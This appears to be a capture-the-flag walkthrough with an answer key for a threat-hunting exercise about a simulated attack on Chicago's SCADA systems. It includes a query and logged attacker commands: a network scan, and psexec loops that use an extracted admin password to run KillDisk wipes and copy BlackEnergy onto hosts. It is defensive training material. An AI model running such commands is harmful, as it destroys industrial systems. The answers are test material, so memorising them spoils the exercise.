


##Critical Compromise In Chicago - ICS: Section 1: Scada Nada<br>
### **Summary**<br>
BREAKING NEWS!: Massive Power Outage Disrupts One of the Country’s Premier Cybersecurity Conferences!
<br><br>
Chicago, IL – A sudden and widespread power outage has plunged the city of Chicago into darkness, causing a huge disruption, including shutting down one of the nation’s leading cybersecurity conferences. Experts are scrambling to assess the cause of the outage, which has affected critical infrastructure and left thousands without power.
<br><br>
Early reports suggest the possibility of a cyberattack targeting the city’s power grid, heightening concerns over the vulnerability of critical systems. Local authorities have urged residents to remain calm as investigations continue into the scope of the incident.
<br><br>
Stay tuned for further updates.
<br><br>


**Q1. Enter Power Up to continue.**<br><br>

**Answer: Power Up**<br><br>


**Q2. Enter Grid Lock to continue.**<br><br>

**Answer: Grid Lock**<br><br>

**Q3. Enter Mission Accepted to continue.**<br><br>

**Answer: Mission Accepted**<br><br>

**Q4. How many results are there for processes that contain SCADA in the commandline?**<br><br>

```
ProcessEvents
| where process_commandline contains "SCADA"
```
<br>

**Answer: 5**<br><br>

**Q5. What is the name of the executable that was used to perform this scan?**<br><br>
The first result returned.<br><br>

```
C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt
```
<br>

**Answer: ICSScanner.exe**<br><br>

**Q6. Paste the full timestamp for when this process was executed.**<br><br>
From previous query.<br><br>

**Answer: 9/9/2024, 11:17:44 AM**<br><br>

**Q7. What command was used to download this file?**<br><br>
Query from question 4.<br><br>

**Answer: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt**<br><br>

**Q8. A destructive tool was used to wipe data and cause the SCADA systems to shut down. 🫨 What is the name of the executable that was used to do this?**<br><br>
The last result from the query from question 4.<br><br>

```
for /F 'tokens=1' %i in (C:\\ProgramData
\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
)
```
<br>

**Answer: KillDisk.exe**<br><br>

**Q9. What legitimate Windows tool was exploited to carry out these remote executions?**<br><br>

```
for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
)
```
<br>

**Answer:  psexec.exe**<br><br>

**Q10. What executable did the theat actor use to establish persistence and perform reconnaissance on the SCADA systems during the attack?**<br><br>

**Answer: BlackEnergy.exe**<br><br>

**Q11. What is the name of the group responsible for these attacks?**<br><br>

**Answer: Sandworm**<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

**Q. **<br><br>

**Answer: **<br><br>

